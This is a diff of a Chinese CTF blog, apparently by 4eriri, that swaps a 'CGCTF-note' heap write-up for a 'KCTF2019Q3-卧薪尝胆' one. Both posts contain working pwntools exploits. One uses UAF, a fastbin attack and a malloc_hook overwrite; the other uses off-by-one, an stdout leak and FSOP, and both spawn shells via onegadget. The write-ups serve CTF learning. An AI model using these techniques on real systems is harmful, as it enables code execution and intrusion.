@@ -15,17 +15,17 @@
 
 
 
-<meta name="description" content="入门堆题，没入门的我看了很久才弄出来。">
+<meta name="description" content="malloc的时候可以打印出地址，fastbin随意在libc中分配一个chunk，然后获取libc地址。 看wp好像edit的时候没有限制范围，所以也可以直接edit去改stdout来leak。 尝试往malloc_hook写了onegadget，然而一直没卵用，才知道原来是程序替换了malloc_hook。 使用FSOP，照抄ctfwiki，然后自己随便调一调就可以了。 exp: 1#cod">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CGCTF-note">
-<meta property="og:url" content="http://yoursite.com/2019/03/13/CGCTF-note/index.html">
+<meta property="og:title" content="KCTF2019Q3-卧薪尝胆">
+<meta property="og:url" content="http://yoursite.com/2019/09/26/KCTF2019Q3-卧薪尝胆/index.html">
 <meta property="og:site_name" content="4eriri&#39;s blog">
-<meta property="og:description" content="入门堆题，没入门的我看了很久才弄出来。">
+<meta property="og:description" content="malloc的时候可以打印出地址，fastbin随意在libc中分配一个chunk，然后获取libc地址。 看wp好像edit的时候没有限制范围，所以也可以直接edit去改stdout来leak。 尝试往malloc_hook写了onegadget，然而一直没卵用，才知道原来是程序替换了malloc_hook。 使用FSOP，照抄ctfwiki，然后自己随便调一调就可以了。 exp: 1#cod">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-26T14:26:51.000Z">
+<meta property="og:updated_time" content="2019-09-26T07:50:43.509Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CGCTF-note">
-<meta name="twitter:description" content="入门堆题，没入门的我看了很久才弄出来。">
+<meta name="twitter:title" content="KCTF2019Q3-卧薪尝胆">
+<meta name="twitter:description" content="malloc的时候可以打印出地址，fastbin随意在libc中分配一个chunk，然后获取libc地址。 看wp好像edit的时候没有限制范围，所以也可以直接edit去改stdout来leak。 尝试往malloc_hook写了onegadget，然而一直没卵用，才知道原来是程序替换了malloc_hook。 使用FSOP，照抄ctfwiki，然后自己随便调一调就可以了。 exp: 1#cod">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +57,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>CGCTF-note | 4eriri&#39;s blog</title>
+<title>KCTF2019Q3-卧薪尝胆 | 4eriri&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -200,11 +200,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-CGCTF-note" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-KCTF2019Q3-卧薪尝胆" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/13/CGCTF-note/" class="article-date">
-      <time datetime="2019-03-13T15:19:00.000Z" itemprop="datePublished">2019-03-13</time>
+      <a href="/2019/09/26/KCTF2019Q3-卧薪尝胆/" class="article-date">
+      <time datetime="2019-09-26T07:46:59.000Z" itemprop="datePublished">2019-09-26</time>
 </a>
 
 
@@ -219,7 +219,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      CGCTF-note
+      KCTF2019Q3-卧薪尝胆
     </h1>
   
 
@@ -236,20 +236,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>入门堆题，没入门的我看了很久才弄出来。</p>
-<a id="more"></a>
-<h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><p>一个简单的note程序：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.add</span><br><span class="line">2.show</span><br><span class="line">3.edit</span><br><span class="line">4.delete</span><br><span class="line">5.exit</span><br><span class="line">choice&gt;&gt;</span><br></pre></td></tr></table></figure>
-<p>通过ida分析发现没有堆溢出，但是delete的时候指针没有置零，存在UAF。</p>
-<p>开启了pie，所以大致思路是泄漏出libc的真实地址然后修改<code>malloc_hook</code>来执行onegadget。</p>
-<h1 id="泄漏libc真实地址"><a href="#泄漏libc真实地址" class="headerlink" title="泄漏libc真实地址"></a>泄漏libc真实地址</h1><p>先分配两个smallchunk，然后delete第一个，其fd和bk指针就会指向<code>main_arena+88</code>，此时因为UAF，使用show功能就可以得到<code>main_arena+88</code>的真实地址。</p>
-<p>通过<code>main_arena+88</code>在libc文件中的偏移，就可以得到libc的真实基址。</p>
-<h1 id="修改malloc-hook"><a href="#修改malloc-hook" class="headerlink" title="修改malloc_hook"></a>修改malloc_hook</h1><p>在调用malloc函数时，程序会对<code>malloc_hook</code>进行检查，如果不为0，就会调用<code>malloc_hook</code>指向的函数，借此调用onegadget。</p>
-<p>fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。利用UAF修改掉最后并进fastbin中的chunk的fd指针，使其指向任意地址，这样之后第二次malloc出的chunk就会出现在任意地址上，从而实现任意地址写。</p>
-<p>但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要对这个地址进行构造，利用gdb查看内存了解如何构造。</p>
-<h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh=process(&quot;./note3&quot;)</span><br><span class="line">sh=remote(&quot;45.76.173.177&quot;,6666)</span><br><span class="line">elf=ELF(&quot;./note3&quot;)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Size:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Content:&quot;)</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">def show(index):</span><br><span class="line">	sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">	sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">	sh.sendline(content)</span><br><span class="line">def delete(index):</span><br><span class="line">	sh.recvuntil(&quot;choice&gt;&gt;&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index:&quot;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">add(136,&apos;aaaaaaaaabcdefgh&apos;)</span><br><span class="line">add(136,&apos;&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_base=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))-0x397b00-88</span><br><span class="line">onegadget=libc_base+0xd694f</span><br><span class="line">malloc_hook=libc_base+0x397b00-0x10</span><br><span class="line">add(96,&apos;\x22&apos;*16)</span><br><span class="line">delete(2)</span><br><span class="line">edit(2,p64(malloc_hook-0x23))</span><br><span class="line">add(96,&apos;&apos;)</span><br><span class="line">add(96,&apos;\x00&apos;*19+p64(onegadget))</span><br><span class="line">sh.recvuntil(&quot;choice&gt;&gt;&quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;Size:&quot;)sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>本地process会错误退出，但是remote的话就能成功拿到shell，不知道为啥呢orz</p>
-
+        <a id="more"></a>
+<p>malloc的时候可以打印出地址，fastbin随意在libc中分配一个chunk，然后获取libc地址。</p>
+<p>看wp好像edit的时候没有限制范围，所以也可以直接edit去改stdout来leak。</p>
+<p>尝试往<code>malloc_hook</code>写了onegadget，然而一直没卵用，才知道原来是程序替换了<code>malloc_hook</code>。</p>
+<p>使用FSOP，照抄ctfwiki，然后自己随便调一调就可以了。</p>
+<p>exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#coding=UTF-8from pwn import *from LibcSearcher import *#context.log_level=&apos;debug&apos;onegadget=[0x45216,0x4526a,0xf02a4,0xf1147]def add(Size):	sh.recvuntil(&apos;&gt;&gt;&apos;)	sh.sendline(&apos;1&apos;)	sh.recvuntil(&apos;size : &apos;)	sh.sendline(str(Size))def edit(idx,content):	sh.recvuntil(&apos;&gt;&gt;&apos;)	sh.sendline(&apos;3&apos;)	sh.recvuntil(&apos;idx : &apos;)	sh.sendline(str(idx))	sh.recvuntil(&apos;text : &apos;)	sh.send(content)def delete(idx):	sh.recvuntil(&apos;&gt;&gt;&apos;)	sh.sendline(&apos;2&apos;)	sh.recvuntil(&apos;idx : &apos;)	sh.sendline(str(idx))libc=ELF(&quot;libc-2.23.so&quot;)while True:	sh=process(&quot;./pwn&quot;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;libc-2.23.so&apos;&#125;)	add(0x102)#0	sh.recvuntil(&apos;heap 0 : &apos;)	heap0=int(sh.recv(14),16)	#print hex(heap0)	add(0x68)#1	add(0xf0)#2	add(0x20)#3	payload = p64(0) + p64(0x101) + p64(heap0) * 2 + &quot;A&quot;*0xe0 + p16(0x100)	edit(0,payload)	payload = &apos;\x00&apos;*0x60 + p64(0x170)	edit(1,payload)	delete(2)	delete(1)	add(0xf0)#1	delete(1)	add(0x160)#1	edit(1,&apos;\x00&apos;*0xf0+p64(0)+p64(0x71)+p16(0x1aed)+&apos;\n&apos;)	add(0x60)#2	add(0x60)#4 #control malloc_hook	try:		sh.recvuntil(&apos;heap 4 : &apos;)	except EOFError:		sh.close()		continue	else:			leak=int(sh.recv(14),16)		libcbase=leak+0x23+0x10-0x3c4b20-0x10		log.success(&quot;libcbase: &quot;+hex(libcbase))		delete(2)		edit(1,&apos;\x00&apos;*0xf0+p64(0)+p64(0x71)+p64(libcbase+libc.sym[&apos;_IO_list_all&apos;]-0x23)+&apos;\n&apos;)		add(0x60)#2		add(0x60)#5		add(0x200)#6		sh.recvuntil(&apos;heap 6 : &apos;)		fake=int(sh.recv(14),16)		edit(6,&apos;/bin/sh\x00&apos;*(0x20/8)+p64(0)+p64(1)+&apos;a&apos;*144+p64(0)+&apos;a&apos;*0x10+p64(fake+0x100)+&apos;\x00&apos;*56+p64(libcbase+onegadget[0])+&apos;\n&apos;)		edit(5,&apos;\x00&apos;*19+p64(fake)+&apos;\n&apos;)		sh.recvuntil(&apos;&gt;&gt;&apos;)		sh.sendline(&apos;4&apos;)		#gdb.attach(sh)		sh.interactive()		break</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -257,13 +250,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/13/CGCTF-note/">CGCTF-note</a></p>
+        <p><span>本文标题:</span><a href="/2019/09/26/KCTF2019Q3-卧薪尝胆/">KCTF2019Q3-卧薪尝胆</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
-        <p><span>发布时间:</span>2019-03-13, 23:19:00</p>
-        <p><span>最后更新:</span>2019-03-26, 22:26:51</p>
+        <p><span>发布时间:</span>2019-09-26, 15:46:59</p>
+        <p><span>最后更新:</span>2019-09-26, 15:50:43</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/13/CGCTF-note/" title="CGCTF-note">http://yoursite.com/2019/03/13/CGCTF-note/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/13/CGCTF-note/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/09/26/KCTF2019Q3-卧薪尝胆/" title="KCTF2019Q3-卧薪尝胆">http://yoursite.com/2019/09/26/KCTF2019Q3-卧薪尝胆/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/09/26/KCTF2019Q3-卧薪尝胆/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -275,16 +268,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/17/CONFidence2019-oldschool/">
-                    CONFidence2019-oldschool
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/12/32位程序调用64位代码/">
-                    调用64位代码的32位程序逆向
+                <a href="/2019/09/25/ciscn-2019-sw-7/">
+                    ciscn_2019_sw_7
                 </a>
             </div>
         
@@ -296,7 +283,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单分析"><span class="toc-number">1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#泄漏libc真实地址"><span class="toc-number">2.</span> <span class="toc-text">泄漏libc真实地址</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#修改malloc-hook"><span class="toc-number">3.</span> <span class="toc-text">修改malloc_hook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#最终exp"><span class="toc-number">4.</span> <span class="toc-text">最终exp</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -332,7 +319,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"CGCTF-note　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"KCTF2019Q3-卧薪尝胆　| 4eriri's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -351,8 +338,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://yoursite.com/2019/03/13/CGCTF-note/';
-            this.page.identifier = '2019/03/13/CGCTF-note/';
+            this.page.url = 'http://yoursite.com/2019/09/26/KCTF2019Q3-卧薪尝胆/';
+            this.page.identifier = '2019/09/26/KCTF2019Q3-卧薪尝胆/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -374,15 +361,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/17/CONFidence2019-oldschool/" title="上一篇: CONFidence2019-oldschool">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019/03/12/32位程序调用64位代码/" title="下一篇: 调用64位代码的32位程序逆向">
+            <a href="/2019/09/25/ciscn-2019-sw-7/" title="下一篇: ciscn_2019_sw_7">
                 <i class="fa fa-angle-right"></i>
             </a>
         
